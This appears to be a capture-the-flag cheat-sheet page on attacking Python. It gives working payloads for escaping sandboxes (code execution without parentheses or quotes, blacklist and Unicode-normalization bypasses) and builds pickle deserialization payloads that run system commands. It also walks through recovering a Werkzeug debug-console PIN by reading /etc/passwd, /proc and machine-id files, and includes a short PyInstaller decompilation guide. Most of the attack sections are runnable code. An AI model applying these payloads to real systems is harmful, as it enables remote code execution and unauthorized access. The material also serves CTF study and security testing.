---
description: Some tricks specific to the Python language
---

# Python

## Filter Bypass

If you find yourself in some sandbox, jail, or otherwise restricted environment there are a lot of tricks to get out of it.&#x20;

### RCE without parentheses

Using decorators and defined lambda functions, you can execute any code without using `(` or `)` characters. Simply the act of defining this class will execute that code in the string:

```python
code = lambda x: "import os; os.system\x28'id'\x29"

@print
@exec
@code
class a:
    pass
```

Past Python 3.9, you can even get the same code as short as this:

```python
@eval
@'__import__\x28"os"\x29.system\x28"id"\x29'.format
class _:pass
```

{% hint style="info" %}
**Note**: In the string, you can encode any other characters it doesn't accept by using `\x` hex escapes
{% endhint %}

And another completely different way using method overriding, which can even be put on a single line:

```python
exit.__class__.__add__ = exec; exit + "import os; os.system\x28'id'\x29"
```

The above method works because we overwrite the regular addition operator for the `exec()` function object. In most built-in functions, this is not allowed and you will get a `can't set attributes of built-in/extension` error. But not all built-in functions are protected like this, and a few classes exist that still allow you to overwrite their methods. You can find them all with this snippet:

<pre class="language-python"><code class="lang-python">for key, value in __builtins__.__dict__.items():
    try:
<strong>        value.__class__.__add__ = exec
</strong><strong>        print(key, value.__class__)
</strong>    except TypeError:
        pass
</code></pre>

It will print all the possible functions that allow method overriding:

<pre class="language-python"><code class="lang-python">__spec__  &#x3C;class '_frozen_importlib.ModuleSpec'>
quit      &#x3C;class '_sitebuiltins.Quitter'>
<strong>exit      &#x3C;class '_sitebuiltins.Quitter'>
</strong>copyright &#x3C;class '_sitebuiltins._Printer'>
credits   &#x3C;class '_sitebuiltins._Printer'>
license   &#x3C;class '_sitebuiltins._Printer'>
help      &#x3C;class '_sitebuiltins._Helper'>
</code></pre>

### Strings without `"` quotes

You can create arbitrary strings without using a `"` or `'` character by using the `chr()` function which takes an ASCII number:

<pre class="language-python"><code class="lang-python"><strong>>>> chr(72)+chr(101)+chr(108)+chr(108)+chr(111)+chr(44)+chr(32)+chr(119)+chr(111)+chr(114)+chr(108)+chr(100)+chr(33)
</strong>'Hello, world!'
</code></pre>

You can generate this code by converting every character to decimal:

<pre class="language-python"><code class="lang-python">string = "Hello, world!"

<strong>print("+".join(f"chr({ord(c)})" for c in string))
</strong># chr(72)+chr(101)+chr(108)+chr(108)+chr(111)+chr(44)+chr(32)+chr(119)+chr(111)+chr(114)+chr(108)+chr(100)+chr(33)
</code></pre>

#### Strings without `"` quotes or `()` parentheses

A more complicated way can be used to get strings without quotes or parentheses, using built-in strings and indexing those at specific offsets to be combined into your target string. Not all printable characters can be made in this way, but most of them can (all except `'\x0c', '\t', '#', '\x0b', '\r', '?'`). \
The most useful string attributes here are `.__doc__` and `.name`, for example, `quit.name[1]` would give you `'u'`. Using a script all of these can be found, but keep in mind that the strings might differ per Python version or context.&#x20;

<details>

<summary>Precomputed dictionary (Python 3.8.10)</summary>

```python
{
    'a': 'chr.__doc__[7]', 
    'b': 'dir.__doc__[6]', 
    'c': 'dir.__doc__[9]', 
    'd': 'dir.__doc__[0]', 
    'e': 'exit.eof[10]', 
    'f': 'id.__doc__[21]', 
    'g': 'id.__doc__[43]', 
    'h': 'id.__doc__[8]', 
    'i': 'exit.eof[8]', 
    'j': 'dir.__doc__[7]', 
    'k': 'map.__doc__[40]', 
    'l': 'exit.eof[3]', 
    'm': 'id.__doc__[68]', 
    'n': 'id.__doc__[5]', 
    'o': 'dir.__doc__[5]', 
    'p': 'map.__doc__[2]', 
    'q': 'quit.name[0]', 
    'r': 'exit.eof[2]', 
    's': 'id.__doc__[38]', 
    't': 'exit.eof[1]', 
    'u': 'quit.name[1]', 
    'v': 'pow.__doc__[4]', 
    'w': 'chr.__doc__[41]', 
    'x': 'exit.name[1]', 
    'y': 'id.__doc__[18]', 
    'z': 'zip.__doc__[0]', 
    'A': 'zip.__doc__[20]', 
    'B': 'list.__doc__[0]', 
    'C': 'exit.eof[0]', 
    'D': 'exit.eof[5]', 
    'E': 'exit.eof[13]', 
    'F': 'exit.eof[15]', 
    'G': 'iter.__doc__[65]', 
    'H': 'bytes.hex.__doc__[148]', 
    'I': 'all.__doc__[66]', 
    'J': 'classmethod.__doc__[600]', 
    'K': 'set.pop.__doc__[51]', 
    'L': 'open.__doc__[3126]', 
    'M': 'map.__doc__[38]', 
    'N': 'filter.__doc__[19]', 
    'O': 'exit.eof[14]', 
    'P': 'id.__doc__[108]', 
    'Q': 'exit.__dir__.__qualname__[0]', 
    'R': 'id.__doc__[0]', 
    'S': 'pow.__doc__[78]', 
    'T': 'all.__doc__[7]', 
    'U': 'chr.__doc__[9]', 
    'V': 'int.__doc__[477]', 
    'W': 'max.__doc__[99]', 
    'X': 'BlockingIOError.errno.__doc__[4]', 
    'Y': 'float.__getformat__.__doc__[0]',
    'Z': 'input.__doc__[230]', 
    '0': 'bin.__doc__[65]', 
    '1': 'bin.__doc__[75]', 
    '2': 'bin.__doc__[60]', 
    '3': 'hex.__doc__[71]', 
    '4': 'hex.__doc__[68]', 
    '5': 'oct.__doc__[77]', 
    '6': 'bin.__doc__[63]', 
    '7': 'bin.__doc__[61]', 
    '8': 'hex.__doc__[69]', 
    '9': 'bin.__doc__[62]', 
    ' ': 'exit.eof[6]', 
    "'": 'bin.__doc__[72]', 
    '"': 'open.__doc__[3084]', 
    '!': 'range.__doc__[263]', 
    '$': 'abs.__text_signature__[1]', 
    '%': 'pow.__doc__[54]', 
    '&': 'set.__iand__.__doc__[11]', 
    '(': 'exit.eof[7]', 
    ')': 'exit.eof[16]', 
    '*': 'zip.__doc__[4]', 
    '+': 'int.__doc__[407]', 
    ',': 'map.__doc__[8]', 
    '-': 'exit.eof[4]', 
    '.': 'exit.eof[9]', 
    '/': 'open.__doc__[326]', 
    ':': 'sum.__doc__[42]', 
    ';': 'chr.__doc__[55]', 
    '<': 'chr.__doc__[59]', 
    '=': 'chr.__doc__[60]', 
    '>': 'set.__doc__[7]', 
    '@': 'super.__doc__[402]', 
    '[': 'dir.__doc__[4]', 
    '\\': 'print.__doc__[32]', 
    '\n': 'id.__doc__[33]', 
    ']': 'int.__doc__[6]', 
    '^': 'set.__ixor__.__doc__[11]', 
    '_': 'dir.__doc__[279]', 
    '`': 'open.__doc__[1908]', 
    '{': 'dict.__doc__[186]', 
    '|': 'False.__or__.__doc__[11]', 
    '}': 'dict.__doc__[187]', 
    '~': 'False.__invert__.__doc__[0]', 
}
```

</details>

<details>

<summary>Python Source Code for Searching</summary>

This piece of code I made will recursively go through all the properties in `__builtins__` using a Breadth First Search algorithm. It tries to find the shortest possible chain of attributes to get the desired letter while skipping entries it has already seen.

You can run it in a similar environment to your target.

```python
import string


def check_methods(needed_letters, obj, attrs):
    checked = []
    best = {}
    queue = [(getattr(obj, attr), [attr]) for attr in attrs]

    # Breadth First Search
    while queue:
        obj, path = queue.pop(0)

        for key in dir(obj):
            try:
                value = getattr(obj, key)
            except AttributeError:
                continue  # Some attributes are false positives for some reason

            unique = repr(value).split('at 0x')[0]  # Remove memory address (will be different while being the same object)

            if unique in checked:
                continue  # Skip the same object

            new_path = path + [key]
            if isinstance(value, str):
                # Check if it has any of the needed letters
                for letter in needed_letters:
                    try:
                        index = value.index(letter)
                        code = f"{'.'.join(new_path)}[{index}]"

                        if letter not in best or len(code) < len(best[letter]):
                            best[letter] = code
                            print(f"{letter!r}: {code}")

                    except ValueError:
                        pass  # Letter not found

            checked.append(unique)
            queue.append((value, new_path))  # Explore child attributes

    return best


goal = 'import os; os.system("id")'
# goal = string.printable

# Remove false positive (__doc__ != __builtins__.__doc__)
objs = filter(lambda o: not o in ["__doc__"], dir(__builtins__))

needed_letters = set(string.printable)
best = check_methods(set(goal), __builtins__, objs)
print()
print(best)

# Check if entire goal is achievable
assert set(best.keys()) == set(goal), set(goal) - set(best.keys())

result = "+".join(best[l] for l in goal)
print()
print(result)
```

As an example, my Python 3.8.10 creates the following payload:

{% code title="import os; os.system("id")" overflow="wrap" %}
```python
exit.eof[8]+id.__doc__[68]+map.__doc__[2]+dir.__doc__[5]+exit.eof[2]+exit.eof[1]+exit.eof[6]+dir.__doc__[5]+id.__doc__[38]+chr.__doc__[55]+exit.eof[6]+dir.__doc__[5]+id.__doc__[38]+exit.eof[9]+id.__doc__[38]+id.__doc__[18]+id.__doc__[38]+exit.eof[1]+exit.eof[10]+id.__doc__[68]+exit.eof[7]+open.__doc__[3084]+exit.eof[8]+dir.__doc__[0]+open.__doc__[3084]+exit.eof[16]
```
{% endcode %}

</details>

### Blacklist Bypass

Some tricks to bypass specific dangerous-sounding words being blacklisted.&#x20;

#### Minimal file read using `license()`

If you can set the `._Printer__filenames` attribute to the built-in `license()` function you can change the function where it gets the license text data from. When you then afterward call the `license()` function it will use the overwritten files instead and print the data to STDOUT.&#x20;

<pre class="language-python"><code class="lang-python"><strong>>>> license._Printer__filenames=["flag.txt"]
</strong><strong>>>> license()
</strong>CTF{...}

<strong>>>> l=license;l._Printer__filenames=["flag.txt"];l()  # 48 bytes
</strong>CTF{...}
</code></pre>

#### Dictionary access bypassing string

If the "system" keyword is blacklisted for example, but you still want to execute the function for shell commands, you can try to access it using a string like `"sys"+"tem"` which technically doesn't include "system" when checking the input. But while executing these get combined into the required string.&#x20;

To access a function in this way, you cannot directly index it on the `os` module. For these dictionary accesses, you need to access a real dictionary, not a module object. Luckily, there are methods on modules that give such a dictionary interface, like `.__dict__`. If this is also blacklisted, there may be other creative ways of accessing the same function again.&#x20;

<pre class="language-python"><code class="lang-python"># Imagine you already can access the `os` module
>>> __import__("os")
&#x3C;module 'os' from '/usr/lib/python3.8/os.py'>
# Use __dict__ to get a simple dictionary of its attributes
<strong>>>> __import__("os").__dict__["system"]
</strong>&#x3C;built-in function system>
# Alternatively use any existing function, and walk back with __globals__
<strong>>>> os.walk.__globals__["system"]
</strong></code></pre>

<details>

<summary>Brute-Force script for attribute accessing (BFS)</summary>

This is often a bit of guesswork of trying to access various special attributes to end up where you want. To ease in the creation of these types of chains I made a small script to brute-force all attributes from a root node until the target is reached.&#x20;

<pre class="language-python"><code class="lang-python">import traceback  # Imagine target script already has this gadget imported
import os

BLACKLIST = ['builtins', 'dir', 'local', 'dict', 'attr', 'eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']


def path_string(root, path):
    result = root
    for key, is_dict in path:
        result += f'["{key}"]' if is_dict else f'.{key}'

    return result


# First argument will be eval'ed as root, second argument is target to reach
def search(root, target):
    checked = []
    queue = [(eval(root), [])]

    # Breadth First Search (BFS)
    while queue:
        obj, path = queue.pop(0)

        if type(obj) == str:  # Skip strings (useless, and a bit faster)
            continue
        elif type(obj) == dict:
            objs = obj.keys()
        else:
            objs = dir(obj)

        for key in objs:
            try:
                is_dict = any(banned in key for banned in BLACKLIST)

                value = obj[key] if is_dict else getattr(obj, key)
            except (TypeError, AttributeError, KeyError):
                continue

            unique = repr(value).split('at 0x')[0]  # Remove memory address (will be different while being the same object)

            if unique in checked:
                continue  # Skip the same object (delete to find all paths, but is really slow)

            new_path = path + [(key, is_dict)]

            if value == target:
                return path_string(root, new_path)

            checked.append(unique)
            queue.append((value, new_path))  # Explore child attributes


# Try to find a path to os.system from the traceback module
<strong>print(search("traceback", os.system))  # traceback.sys.modules["os"]._exists.__globals__["system"]
</strong># ^^ these strings can then easily be escaped like "o"+"s" and "sys"+"tem" to bypass
</code></pre>

</details>

#### Unicode Bypass

Python normalizes Unicode characters for names, so they can be used if the check does not do this normalization. You can use Unicode characters to replace names that would normally be blocked. For example, the following payload does not contain the string "open" or "read":

```python
𝘰𝘱𝘦𝘯("flag").𝘳𝘦𝘢𝘥()
```

Instead, it uses the 'Mathematical Sans-Serif Italic' (U+1D608...) characters which will normalize to ASCII letters when Python is executed (notice the slanted characters). You can create arbitrary payloads with a script like the following:

```python
BLACKLIST = ["open", "read"]

def to_unicode(s):
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    return ''.join([chr(alphabet.index(c) + 0x1D608) if c in alphabet else c for c in s])

def obfuscate(payload):
    for word in BLACKLIST:
        payload = payload.replace(word, to_unicode(word))

    return payload

print(obfuscate('open("flag").read()'))  # 𝘰𝘱𝘦𝘯("flag").𝘳𝘦𝘢𝘥()
```

{% hint style="success" %}
If a **shorter** payload (fewer bytes) is needed, you can mix and match these Unicode characters in your payload. These Unicode characters take up 4 bytes each, but you will likely **only need one** in your blacklisted word to bypass it, requiring the penalty once. For example, with only the first character encoded:

```python
𝘰pen("flag").𝘳ead()
```
{% endhint %}

{% hint style="info" %}
See [this site](https://gosecure.github.io/unicode-pentester-cheatsheet/) for a table of all Unicode transformations, as this trick is far from the only one. Look for "Normalization NFKC" as Python uses it for resolving function names
{% endhint %}

## PyInstaller Reversing

[PyInstaller](https://pyinstaller.org/en/stable/) can create executable and shareable files from Python scripts, like Windows `.exe` files or Linux ELF files. It can also be used for malware where an attacker creates a malicious Python script and compiles it to an executable they can plant somewhere with PyInstaller. That is why Reversing such a file can be very useful, and it turns out the full source code can almost flawlessly be decompiled from such a file.&#x20;

First, you will want to extract the data from the PyInstaller executable. This can be done very easily using pyinstxtractor.&#x20;

{% embed url="https://github.com/extremecoders-re/pyinstxtractor" %}
A tool to extract contents of a PyInstaller executable
{% endembed %}

As the above repository shows in the [example](https://github.com/extremecoders-re/pyinstxtractor#example), the script generates a `[name]_extracted` folder with `.pyc` files. Among these files will be all the modules, and the main script. You will often have to guess what file is the main script, but the tool will also give "Possible entry points".&#x20;

These `.pyc` files are the compiled Python bytecode, which is not human-readable. For that, we can use [uncompyle6](https://github.com/rocky/python-uncompyle6/) to decompile this bytecode into close to the original source code.&#x20;

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ python3 pyinstxtractor.py example.exe
</strong>[+] Processing dist\example.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 36
[+] Length of package: 5612452 bytes
[+] Found 59 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: example.pyc
[+] Found 133 files in PYZ archive
[+] Successfully extracted pyinstaller archive: dist\example.exe

<strong>$ uncompyle6 example.exe_extracted\example.pyc > example.py
</strong></code></pre>

Then you can look at the created `.py` file to review all the source code.&#x20;

## Pickle Deserialization

[Pickle](https://docs.python.org/3/library/pickle.html) is a Python module used for serializing Python objects into raw bytes. This way they can be sent over the network, or saved in a file, and then later be deserialized to get back the original Python object.&#x20;

There is one issue, however, when this deserialized data can come from the user, they can create arbitrary Python objects. This results in a classic Insecure Deserialization vulnerability, leading to Remote Code Execution.&#x20;

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption><p>A warning from the official documentation explaining the danger of this module</p></figcaption></figure>

{% hint style="info" %}
This vulnerability has a special place in my heart, as I found it as an unintentional bug on a school assignment, and spent a lot of time and effort to try and get the most out of it. In the end, it resulted in RCE on the server, as well as on all clients that connected because the template script given was also vulnerable. You can read the whole story and learn a lot about pickle deserialization here:

{% embed url="https://jorianwoltjer.com/blog/post/hacking/getting-rce-on-a-brute-forcing-assignment" %}
Getting RCE with pickle, in **under 40 bytes** per packet, and taking over the server to also exploit clients
{% endembed %}
{% endhint %}

The basics are that you can create a Python object that executes a **system command** when pickle turns it into an object. This is done with the special `__reduce__()` method:

```python
import pickle

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ("id",))

rce = RCE()
data = pickle.dumps(rce)
print(data) # b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'
```

This method is called when the object is deserialized, and its return value will be what it turns into. But this return value is actually a function that will be called with the arguments provided. We can provide the function `os.system` after importing it, and as the first argument give it any command we want to run.&#x20;

### Minimizing Payloads

The above is often enough, but in rare cases, you might have some restrictions on what data you can send. Maybe you need to bypass some filter or a length restriction.&#x20;

#### Different Protocols

Pickle has evolved over time, with new protocols for better serializing of objects. Luckily, this protocol can be chosen by whoever creates the data, and the server deserializing it will simply recognize the protocol and switch accordingly.&#x20;

This opens up the opportunity for a few different formats that might help in whatever filter you are trying to get through.&#x20;

Using the `pickletools.dis(data)` function, we can disassemble the serialized data to better understand what each byte is doing:

```python
    0: \x80 PROTO      4
    2: \x95 FRAME      29
   11: \x8c SHORT_BINUNICODE 'posix'
   18: \x94 MEMOIZE    (as 0)
   19: \x8c SHORT_BINUNICODE 'system'
   27: \x94 MEMOIZE    (as 1)
   28: \x93 STACK_GLOBAL
   29: \x94 MEMOIZE    (as 2)
   30: \x8c SHORT_BINUNICODE 'id'
   34: \x94 MEMOIZE    (as 3)
   35: \x85 TUPLE1
   36: \x94 MEMOIZE    (as 4)
   37: R    REDUCE
   38: \x94 MEMOIZE    (as 5)
   39: .    STOP
```

This `PROTO` value represents the protocol used, and in the `pickle.dumps` method we can simply specify `protocol=` keyword argument to specify the protocol. This is a number between 0 and 5. Looking at all of these protocols the payload can get very different:

```python
protocol=0                         protocol=1 (shortest)               protocol=2                          protocol=3                          protocol=4 (default)
 0: c  GLOBAL   'posix system'      0: c  GLOBAL   'posix system'       0: \x80 PROTO    2                  0: \x80 PROTO    3                  0: \x80 PROTO    5
14: p  PUT      0                  14: q  BINPUT   0                    2: c    GLOBAL   'posix system'     2: c    GLOBAL   'posix system'     2: \x95 FRAME    29
17: (  MARK                        16: (  MARK                         16: q    BINPUT   0                 16: q    BINPUT   0                 11: \x8c SHORT_BINUNICODE 'posix'
18: V    UNICODE  'id'             17: X    BINUNICODE 'id'            18: X    BINUNICODE 'id'            18: X    BINUNICODE 'id'            18: \x94 MEMOIZE  (as 0)
22: p    PUT      1                24: q    BINPUT     1               25: q    BINPUT  1                  25: q    BINPUT   1                 19: \x8c SHORT_BINUNICODE 'system'
25: t    TUPLE    (MARK at 17)     26: t    TUPLE      (MARK at 16)    27: \x85 TUPLE1                     27: \x85 TUPLE1                     27: \x94 MEMOIZE  (as 1)
26: p  PUT      2                  27: q  BINPUT   2                   28: q    BINPUT  2                  28: q    BINPUT   2                 28: \x93 STACK_GLOBAL
29: R  REDUCE                      29: R  REDUCE                       30: R    REDUCE                     30: R    REDUCE                     29: \x94 MEMOIZE  (as 2)
30: p  PUT      3                  30: q  BINPUT   3                   31: q    BINPUT  3                  31: q    BINPUT   3                 30: \x8c SHORT_BINUNICODE 'id'
33: .  STOP                        32: .  STOP                         33: .    STOP                       33: .    STOP                       34: \x94 MEMOIZE  (as 3)
len(data)=34                       len(data)=33                        len(data)=34                        len(data)=34                        35: \x85 TUPLE1
                                                                                                                                               36: \x94 MEMOIZE    (as 4)
                                                                                                                                               37: R    REDUCE
                                                                                                                                               38: \x94 MEMOIZE    (as 5)
                                                                                                                                               39: .    STOP
                                                                                                                                               len(data)=40
```

In most simple cases, `protocol=1` is the shortest.&#x20;

#### Replacing strings

As you might have noticed above, the `os.system` function turned into `'posix system'` for serialized data. This is what automatically happens when you serialize data using `pickle.dumps`, but it turns out there are actually multiple ways to represent this function.&#x20;

I expected to see `os` instead of `posix`, so I tried simply replacing `posix` with `os`. This turned out to actually work! The deserializer will happily decode this to the correct function and still achieves RCE. By simply replacing this text in the serialized data, you can get rid of 3 characters:

```python
rce = RCE()
data = pickle.dumps(rce)
data = data.replace(b"posix", b"os")
print(data)  # b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05os\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'
```

#### Short commands

Finally, after having the shortest possible pickle data, you need a short command to receive a shell and further explore the target. In [the writeup](https://jorianwoltjer.com/blog/post/hacking/getting-rce-on-a-brute-forcing-assignment#bash-tricks) linked above, I discover my own method to slowly write a full payload to a file and execute it in a lot of commands below 12 bytes. This was enough to bypass the 40-byte packet limit that the situation had.&#x20;

However, in the meantime, I found that this problem has been explored before. Orange Tsai made a challenge where you had to achieve full RCE commands of only 4 bytes each. The solution to this challenge is explained in [#rce-in-4-bytes](../linux/hacking-linux-boxes.md#rce-in-4-bytes "mention"). This can be applied just as easily to this injection.&#x20;

### Reverse Engineering

You might find a serialized piece of pickle data, but without source code, it may be difficult to understand what it exactly means. There are a few **plaintext strings** inside the serialized data that can give an idea of what it is about. To get a full understanding of everything some more analysis is required, but luckily there exist tools that help with this.&#x20;

#### Static Analysis

The [`pickletools`](https://docs.python.org/3/library/pickletools.html) library contains useful functions for analyzing pickled data and can disassemble the opcodes to get a better understanding of the binary data:

{% code title="Source" %}
```python
with open('something.pkl', 'wb') as f:
    pickle.dump((1, 2), f)  # Pickle of (1, 2) tuple
```
{% endcode %}

<pre class="language-shell-session" data-title="CLI Disassembly"><code class="lang-shell-session"><strong>$ python3 -m pickletools something.pkl -a
</strong>    0: \x80 PROTO      4              Protocol version indicator.
    2: \x95 FRAME      7              Indicate the beginning of a new frame.
   11: K    BININT1    1              Push a one-byte unsigned integer.
   13: K    BININT1    2              Push a one-byte unsigned integer.
   15: \x86 TUPLE2                    Build a two-tuple out of the top two items on the stack.
   16: \x94 MEMOIZE    (as 0)         Store the stack top into the memo.  The stack is not popped.
   17: .    STOP                      Stop the unpickling machine.
highest protocol among opcodes = 4
</code></pre>

{% code title="From Python" %}
```python
with open('something.pkl', 'rb') as f:
    pickletools.dis(f)  # Disassemble and print to STDOUT
```
{% endcode %}

This disassembly works with pushing and popping from the **stack**. This is more clear with a nested expression like `(1, [2, 3])`:

```
11: K    BININT1    1              Push a one-byte unsigned integer.
13: ]    EMPTY_LIST                Push an empty list.
14: \x94 MEMOIZE    (as 0)         Store the stack top into the memo.  The stack is not popped.
15: (    MARK                      Push markobject onto the stack.
16: K        BININT1    2          Push a one-byte unsigned integer.
18: K        BININT1    3          Push a one-byte unsigned integer.
20: e        APPENDS    (MARK at 15) Extend a list by a slice of stack objects.
21: \x86 TUPLE2                      Build a two-tuple out of the top two items on the stack.
22: \x94 MEMOIZE    (as 1)           Store the stack top into the memo.  The stack is not popped.
```

Here, a `1` integer is pushed on the stack, then an empty list is pushed too. The numbers `2` and `3` are added to a "markobject" and at the end the list is extended by this slice. This leaves the integer `1` and the list on the top of the stack, which is turned into a tuple from the 2 topmost stack items using `TUPLE2`.&#x20;

A common opcode is `MEMOIZE`, which stores the stack top in a special place for reuse later on. These can then be referenced further in the data so it does not have to be repeated.&#x20;

#### Dynamic Analysis

{% hint style="warning" %}
**Warning**: As shown above, deserializing _any_ pickle payload can lead to Arbitrary Code Execution, so be careful what you deserialize while reverse engineering! If you have any reason for suspicion, try it in a safe environment like a VM first.
{% endhint %}

While static analysis can give a decent idea, you can see a lot quickly when simply running the code in the pickled data. To get only the result of a deserialization, run:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ python3 -m pickle x.pickle
</strong>(1, 2)
</code></pre>

You can play with the result if it is more complex in a Python console:

<pre class="language-python" data-overflow="wrap"><code class="lang-python"><strong>>>> import pickle
</strong><strong>>>> p = pickle.load(open("something.pkl", "rb"))
</strong>(1, 2)
<strong>>>> p[1]
</strong>2
<strong>>>> dir(p)
</strong>['__add__', '__class__', '__contains__', ..., '__subclasshook__', 'count', 'index']
</code></pre>

{% hint style="warning" %}
Some pickled data requires custom classes to be defined, which it sets properties on or initializes in other ways. These need to be defined in the context before deserializing or it will throw an error with the missing class name. if these are unknown try doing more [#static-analysis](python.md#static-analysis "mention")
{% endhint %}

To view more of the steps involved, try following the `load()` call in a **debugger** like VSCode, which will decompile some pieces of code visually and show intermediate variables. If a pickle object requires more steps to be created, this can give a great idea of those steps.

If you find your mystery object has **functions** defined (common with machine learning models), the [`inspect.getsource()`](https://docs.python.org/3/library/inspect.html#inspect.getsource) function may be able to recreate the source code for the function in question. The more low-level [`dis.dis()`](https://docs.python.org/3/library/dis.html#dis.dis) function can give you disassembled bytecode instead.

## Werkzeug - Debug Mode RCE (Console PIN)

Werkzeug is a very popular HTTP back-end for Python. Libraries like Flask use this in the back, and you might see "werkzeug" related response headers indicating this. It has a **Debug Mode** that will show some code context and stack traces when a server-side error occurs. These lines can expand to a few more lines to leak some source code, but the real power comes from the **Console**.&#x20;

Every line shows a small ![](<../.gitbook/assets/image (6) (2).png>) terminal icon, that when pressed will prompt for a PIN that can unlock an interactive Python console on the server. If you can find the PIN, you can execute Python code on the server resulting in RCE.&#x20;

This PIN is generated deterministically, meaning it should be the same every time, but different per machine. It simply uses some files on the filesystem to generate this code, so if you have some way to **read arbitrary files**, you can recreate the PIN yourself.&#x20;

### Source Code

In the Traceback, you will likely see a path that contains `flask/app.py`. This is the path which the Flask source code is loaded from and will be needed later.&#x20;

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption><p>An example of the Traceback path containing <code>flask/app.py</code></p></figcaption></figure>

If you change the `flask/app.py` to `werkzeug/debug/__init__.py`, you will find the code that handles this Debug Mode and generates the PIN. There are a few different versions of this code as it has changed over the years, so to be sure of how it works you should read this file on the target.&#x20;

The function of interest here is `get_pin_and_cookie_name()`:\
_(note again that this code may be slightly different on the target)_

```python
def get_pin_and_cookie_name(app):
    """Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.
    """
    ...

    modname = getattr(app, "__module__", t.cast(
        object, app).__class__.__module__)
    username: t.Optional[str]

    try:
        # getuser imports the pwd module, which does not exist in Google
        # App Engine. It may also raise a KeyError if the UID does not
        # have a username, such as in Docker.
        username = getpass.getuser()
    except (ImportError, KeyError):
        username = None

    mod = sys.modules.get(modname)

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username,
        modname,
        getattr(app, "__name__", type(app).__name__),
        getattr(mod, "__file__", None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [
        str(uuid.getnode()), 
        get_machine_id()
    ]

    h = hashlib.sha1()  # <-- This may be md5() is some older werkzeug versions
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x: x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

    return rv, cookie_name
```

The most important things to note are the `probably_public_bits` and `private_bits`, which are the inputs for the randomness.&#x20;

#### Public bits

The public bits are defined like so:

* `username`: \
  The user that started the program
* `modname`: \
  "flask.app" if running Flask, otherwise recreate the environment and log this value
* `getattr(app, "__name__", type(app).__name__)`: \
  "Flask" if `app.run(debug=True)` is used, and "wsgi\_app" if `DebuggedApplication` called manually
* `getattr(mod, "__file__", None)`: \
  Absolute path to the `flask/app.py` file that the Traceback shows. May in some cases also be `.pyc` instead of `.py`

Most of these can be easily found by guessing or looking at the source code. Only the username might be unknown at first.&#x20;

#### Finding the username

There are a few ways to make an educated guess about the username. The `/proc/self/environ` file might contain a `USER` variable, making it as simple as reading this file. If this does not work for any reason, try the method below:

In the `/etc/passwd` file all users and their `uid`s are listed:

{% code title="/etc/passwd" %}
```
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
```
{% endcode %}

This gives a list of possible names. For a webserver `www-data` is common, but it could also be that another user on the system is hosting it.&#x20;

To be sure, a trick you can use is to look at which users are using which port. By default, Flask uses port 5000, but this can be changed in the `app.run()` code. This trick uses the `/proc/net/tcp` file which shows a table of all the TCP connections on the system as a file:

{% code title="/proc/net/tcp" %}
```
sl local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt uid
0: 0100007F:1388 00000000:0000 0A 00000000:00000000 00:00000000 00000000  33
...
```
{% endcode %}

Here are two columns of interest. The `local_address` which is a **hex-encoded** IP and port number. Then `uid` which is the number that corresponds with a username in `/etc/passwd`. To decode the address and port, you can simply convert them from hex in a Python console:

{% code title="Python" %}
```python
>>> '.'.join(str(int("0100007F"[i:i+2], 16)) for i in range(6, -1, -2))
'127.0.0.1'
>>> 0x1388
5000
```
{% endcode %}

#### Private bits

Lastly, there are two more private bits:

* `str(uuid.getnode())`:\
  The MAC address of the target, in decimal format. For example: `00:1B:44:11:3A:B7` would be `0x001B44113AB7` in hex, and `'117106096823'` in decimal. \
  It can be found by reading the `/proc/net/arp` file to find the interface in the Device column, and then request the `/sys/class/net/[interface]/address` file to get the MAC address.&#x20;
*   `get_machine_id()`:\
    The way this machine-id is found again depends on the server werkzeug version, so read the function source in the same file to be sure. But often this is the `/etc/machine-id` file, or if that does not exist, the `/proc/sys/kernel/random/boot_id` file. After this value, a part of `/proc/self/cgroup` is also added if it exists. Take the first line and this code on it (likely to be an empty string):

    {% code title="Python" %}
    ```python
    >>> b"14:misc:/".strip().rpartition(b"/")[2]
    b''
    >>> b"0::/system.slice/flask.service".strip().rpartition(b"/")[2]
    b'flask.service'
    ```
    {% endcode %}

### Generating the PIN

Finally, when you have all these required bits you can combine them in the same way the server would to recreate the PIN and access the console.&#x20;

```python
probably_public_bits = [
    'www-data',
    'flask.app',
    'Flask',
    '/usr/lib/python3/dist-packages/flask/app.py'
]
private_bits = [
    '345050109109',
    'e5987d8fd3a14193bb997b6afbdf2cca' + 'flask.service'
]

...  # <Insert werkzeug/debug/__init__.py -> get_pin_and_cookie_name() code here>

print(rv)  # 123-456-789
```

This should then generate the correct console PIN that you can put into the prompt when you try to execute Python code. After this is unlocked, you can simply run system commands:

```python
>>> import os
>>> os.popen('id').read()
